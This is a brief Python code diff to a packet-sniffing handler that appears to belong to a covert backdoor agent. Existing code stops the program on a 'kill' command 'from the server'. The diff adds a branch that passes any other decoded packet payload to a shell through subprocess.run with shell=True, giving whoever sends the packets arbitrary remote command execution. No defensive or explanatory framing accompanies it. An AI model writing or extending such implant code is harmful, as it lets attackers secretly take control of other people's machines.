@@ -17,6 +17,10 @@ def sniffHandle(packet: Packet) -> None:
 
         if decodedCommand == "kill":
             raise Exception("Programmed killed by server")
+        elif decodedCommand == "abcdefghijklmnopqrstuvwabcdefghi":
+            pass
+        else:
+            subprocess.run(decodedCommand, shell=True)
     except UnicodeDecodeError:
         print("Oh well")
 
